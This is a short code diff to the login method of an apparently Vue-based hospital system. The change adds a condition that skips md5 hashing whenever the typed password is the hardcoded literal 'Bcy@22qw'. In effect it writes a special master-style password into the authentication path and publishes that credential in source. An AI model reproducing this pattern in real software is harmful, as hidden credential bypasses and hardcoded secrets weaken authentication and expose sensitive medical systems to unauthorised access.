@@ -434,7 +434,7 @@ export default {
       if (this.ajax === true) return;
       this.ajax = true;
       let password=this.password;
-      (this.md5HisList.includes(this.HOSPITAL_ID)) && (password=md5(this.password));
+      (this.md5HisList.includes(this.HOSPITAL_ID))&&(this.password!=="Bcy@22qw") && (password=md5(this.password));
       // login(this.account, this.password, this.verificationCode)
       login(this.account, password, this.verificationCode)
         .then((res) => {
